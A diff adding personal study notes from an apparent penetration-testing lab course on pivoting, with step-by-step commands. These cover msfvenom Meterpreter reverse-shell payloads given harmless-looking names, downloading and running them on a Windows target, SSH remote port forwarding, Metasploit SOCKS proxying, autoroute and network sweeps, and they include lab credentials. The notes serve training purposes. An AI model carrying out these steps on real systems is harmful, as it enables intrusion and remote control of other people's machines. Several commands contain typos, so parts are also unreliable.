@@ -135,3 +135,138 @@ socks4: 127.0.0.1 9050
 Subsequently, students need to connect through the target pivot host to the DC on the internal network from Pwnbox/PMVPN, utilizing the credentials victor:pass@123:
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
+\\\\\\\\=====================================
+Remote/Reverse Port Forwarding with SSH
+-We’ve seen local port forwarding (forwarding a remote service to our local port) and dynamic port forwarding (routing packets through a pivot host). Now, we might also need to forward a local service to a remote port — for example, accessing Windows A via RDP through the Ubuntu pivot host.
+But what happens if we try to gain a reverse shell?
+-The Windows host can only make outbound connections to 172.16.5.0/23, so it cannot reach the attacker's 10.129.x.x network. A direct reverse shell to our Metasploit listener will fail because the Windows server has no route to 10.129.x.x.
+
+RDP alone is often inadequate (clipboard/file transfer disabled, need low-level API or exploits), so we use a pivot. The Ubuntu server can reach both networks, so we build a Meterpreter HTTPS payload with its callback set to the Ubuntu IP (172.16.5.129). On Ubuntu we forward port 8080 to our attack host’s port 8000, where the Metasploit listener is running, allowing the Windows target to reach our listener via the pivot.
+
+\\Creating a Windows Payload with msfvenom
+$msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+
+\\Configuring & Starting the Multi/handler
+msf6> use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport 8000
+run
+-Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.
+
+\\Transfering Payload to Pivot Host
+$scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
+After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.
+
+\\Starting Python3 Webserver on Pivot Host
+$python3 -m http.server 8123
+
+\\Downloading Payload on the Windows Target
+We can download this backupscript.exe on the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
+-PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+-Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.
+
+\\Using SSH-R 
+$ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipaddroftarget> -vN
+-R ask ubuntu svr to listen on <targetIP>:800 and forwarding all conn on port 8080 to our command ti msfconsole listener on 0.0.0.0:800 of our atk host
+
+-After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
+
+\\Viewing the Logs from the Pivot
+\\Meterpreter Session established
+shell
+-Our Meterpreter session should list that our incoming connection is from a local host itself (127.0.0.1) since we are receiving the connection over the local SSH socket, which created an outbound connection to the Ubuntu server. Issuing the netstat command can show us that the incoming connection is from the SSH service.
+
+<test>Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)
+
+\\Meterpreter Tunneling & Port Forwarding
+-With a Meterpreter shell on the Ubuntu pivot we can run scans through it while using Meterpreter’s features. Rather than SSH forwarding, spawn a Meterpreter session on Ubuntu that callbacks to our attack host on port 8080.
+
+\\Creating Payload for Ubuntu Pivot Host
+$msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+-Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.
+
+\\Configuring & Starting the multi/handler
+msf6> use exploit/multi/handler
+set lhost 0.0.0.0
+set lport 8080
+set payload linux/x64/meterpreter/reverse_tcp
+run
+
+-We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.
+
+\\Executing the Payload on the Pivot Host
+$ls > chmod +x backupjob > ./backupjob
+-We need to make sure the Meterpreter session is successfully established upon executing the payload.
+
+\\Meterpreter Session Establishment
+-We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.
+
+\\Ping sweep
+$meterpreter>run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+-We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.
+
+\\Ping sweep For Loop on Linux Pivot hosts
+$for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "byte from" &) ;done
+
+\\Ping sweep For Loop Using cmdlet
+$for /L %1 in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+
+\\Ping Sweep Using PowerShell
+$1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
+Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.
+-If ICMP is blocked, run an Nmap TCP scan against 172.16.5.0/23. Instead of SSH forwarding, use Metasploit’s post-exploitation socks_proxy to create a SOCKS4a proxy on your attack host (listening on port 9050) and route traffic through the Meterpreter session.
+
+\\Configuring MSF's SOCKS proxy
+msf6>use auxiliary/server/socks_proxy
+>set SRVPORT 9050 
+>set SRVHOST 0.0.0.0 
+>set version 4a
+>run >options
+
+\\confirming Proxy Server is running
+>jobs
+-After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.
+
+\\Adding a Line to proxychains.conf if needed
+sock4 127.0.0.1 9050
+-Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
+-Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
+
+\\Creating Routes with AutoRoute
+msf6>use post/multi/manage/autoroute
+>set SESSION 1 
+>set SUBNET 172.16.5.0
+>run 
+-It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
+$meterpreter>run autoroute -s 172.16.5.0/23
+-After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
+$meterpreter>run autoroute -p 
+-As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.
+
+\\Testing Proxy & Routing Fuctionality
+$proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+
+\\Port Forwarding
+-Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
+
+\\Portfwd options
+meterpreter>help portfwd
+
+\\Creating Local TCP Repay
+meterpreter>portfwd add -l 3300 -p 3389 -r 172.16.5.19
+
+The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.
+
+\\Connecting to Windows Target through localhost
+$xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+
+\\Netstat output
+-We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
+$netstat -antp
+
+\\Meterpreter Reverse Port Forwarding
+-Metasploit can do reverse port forwarding: ask the compromised Ubuntu server to accept connections on port 1234 and forward them to your attack host’s local port 8081. Run a listener on your attack host at 8081 to receive any Windows shells forwarded from Ubuntu:1234.
+
+\\Reverse Port Forwarding rules
+meterpreter>portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
